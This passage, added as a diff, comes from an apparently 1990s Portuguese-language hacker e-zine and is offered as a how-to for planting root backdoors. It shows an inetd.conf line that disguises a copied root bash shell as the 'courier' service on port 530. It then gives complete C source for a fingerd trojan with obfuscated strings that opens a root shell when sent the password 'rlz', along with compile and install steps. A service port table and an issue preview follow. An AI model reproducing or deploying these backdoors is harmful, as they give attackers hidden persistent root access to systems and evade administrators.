+3. Coloque a backdoor assim:
+
+courier    stream  tcp   nowait   root   /usr/sbin/in.courierd -i
+
+   Dentro do arquivo /etc/inetd.conf.
+
+	Pronto! Agora de um telnet pela porta 530.
+	Note que vc só copia o /etc/bash para /usr/sbin/in.courierd para en-
+ganar o admin. Aí não fica akele tróço descarado de:
+telnet  stream  tcp     nowait  root    /bin/sh  /bin/sh -i
+
+	'"'"'"'"'"'"'"'" Usando o in.fingerd '"'"'"'"'"'"'"'"'"
+
+	Aki vai um programa em c para substituir o in.finger.
+
+---------------------------------fingtrojan.c--------------------------------
+
+/*  The Fingerd trojan by Hitman Italy
+ *  This source cannot be spread without the whole article
+ *  but you can freely implement or modify it for personal use
+ *  [========================================================]
+ *  Modificado por X-SaTaNiC, Kbyte , soft , AnArChY
+ *  Devico bugs encontrados que fazia com que naum compilasse e a
+ *  backdoor da shell nao executasse direito.
+ *  Mas depois de tantas modificacoes esta ai trojan rodando blz!
+ */
+
+static char copyright[] = "";   /* Copyright String  */
+
+static char sccsid[] = "";      /* Sccsid String     */
+#define SENHA "rlz"             /* SENHA A SER USADA */
+
+#include <stdio.h>
+
+#define PATH_FINGER "/usr/bin/finger" /* DIRETORIO DO FINGER, cliente */
+#define CODE 161
+
+char *HitCrypt(ch)
+char *ch;
+{
+   char *b;
+   b=ch;
+   while ((*(ch++)^=CODE)!=0x00);
+   return(b);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+   register FILE *fp;
+   register int ch;
+   register char *lp;
+   int p[2];
+
+static char exor[4][23]={
+{201,200,213,CODE},
+{142,196,213,194,142,209,192,210,210,214,197,CODE},
+{201,200,213,155,155,145,155,145,155,155,142,155,142,195,200,207,142,194,
+210,201,CODE},
+{227,192,194,202,197,206,206,211,129,192,194,213,200,215,192,213,196,197,
+143,143,143,CODE} };
+
+#define   ENTRIES   50
+   char **ap, *av[ENTRIES + 1], line[1024], *strtok();
+
+#ifdef LOGGING               /* unused, leave it for "strings" command */
+#include <netinet/in.h>
+   struct sockaddr_in sin;
+   int sval;
+
+   sval = sizeof(sin);
+   if (getpeername(0, &sin, &sval) < 0)
+      fatal(argv[0],"getpeername");
+#endif
+
+   if (!fgets(line, sizeof(line), stdin))
+      exit(1);
+
+av[0] = "finger";
+
+   for (lp = line, ap = &av[1];;) {
+      *ap = strtok(lp, " \t\r\n");
+      if (!*ap){
+         break;}
+      if ((*ap)[0] == '/' && ((*ap)[1] == 'W' || (*ap)[1] == 'w'))
+         *ap = "-l";
+      if (++ap == av + ENTRIES)
+         break;
+      lp = NULL;
+   }
+
+   if (pipe(p) < 0)
+      fatal(argv[0],"pipe");
+   if (!strcmp(line,SENHA)) {
+   system("/bin/bash -i");
+   exit(0);
+   }
+   switch(fork()) {
+   case 0:
+      (void)close(p[0]);
+      if (p[1] != 1) {
+         (void)dup2(p[1], 1);
+         (void)close(p[1]);
+      }
+
+         if (execv(PATH_FINGER, av)==-1)
+         fprintf(stderr,"No local finger program found\n");
+      _exit(1);
+   case -1:
+      fatal(argv[0],"fork");
+   }
+   (void)close(p[1]);
+   if (!(fp = fdopen(p[0], "r")))
+      fatal(argv[0],"fdopen");
+   while ((ch = getc(fp)) != EOF) {
+      putchar(ch);
+   }
+   exit(0);
+}
+
+fatal(prg,msg)
+   char *prg,*msg;
+{
+   fprintf(stderr, "%s: ", prg);
+   perror(msg);
+   exit(1);
+}
+
+---------------------------------fingtrojan.c--------------------------------
+
+1. Agora compile-o com: cc -o in.fingerd fingtrojan.c
+
+2. Mova-o para o dir /usr/sbin e pronto, agora para entrar como root use o
+serviço finger(porta 79) do sistema que vc fez a backdoor.
+
+#############################################################################
+$$$$$$$             $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  10. ¡Bonus!  ########################################################
+$$$$$$$             $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+	-=-=-=-=-=Serviços do protocolo TCP=-=-=-=-=-=-=-
+
+SERVIÇO:	PORTA:
+
+tcpmux		1
+echo		7
+discard		9
+systat		11
+daytime		13
+netstat		15
+qotd		17
+chargen		19
+ftp-data	20
+ftp		21
+telnet		23
+smtp		25
+time		37
+whois		43
+domain		53
+mtp             57
+gopher		70
+rje		77
+finger		79
+http		80
+www		80
+link		87
+kerberos	88
+supdup		95
+hostnames	101
+iso-tsap	102
+x400		103
+x400-snd	104
+csnet-ns	105
+pop-2		109
+pop-3		110
+pop		110
+sunrpc		111
+sunrpc		111
+auth		113
+sftp		115
+uucp-path	117
+nntp            119
+ntp		123
+netbios-ns      137
+netbios-dgm     138
+netbios-ssn     139
+imap 		143
+NeWS		144
+exec		512
+login		513
+shell		514
+printer		515
+efs             520
+tempo           526
+courier		530
+conference      531
+netnews         532
+uucp		540
+klogin		543
+kshell		544
+remotefs        556
+pcserver	600
+kerberos-adm	749
+kerberos-sec	750
+kerberos_master	751
+krb5_prop	754
+listen		1025
+nterm		1026
+kpop		1109
+ingreslock      1524
+tnet            1600
+cfinger		2003
+eklogin		2105
+krb524		4444
+irc		6667
+dos		7000
+
+#############################################################################
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+	***Preview***
+
+* Phreaking			; Truques para celulares e telefones a cartão
+* Bugz				; ?????
+* Programação			; 2o parte do tutorial de pascal
+* Virii				; Mais trojans(talvez)
+* Invasão de privacidade	; Hackeando bibliotecas de telnet
+* Vivendo			; Não vou dizer pra não roubarem a ideia
+* Hack, the Art			; ?????
+
+#############################################################################
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+	CSZine é destribuido no #CSCHANNEL no servidor irc.via-rs.com.br
+
+	Se tiver alguma duvida, critica ou materia mail-me :
+	cszine@hotmail.com
+
+	Ou UIN-me :
+	16623675
+
+By Cheat Struck
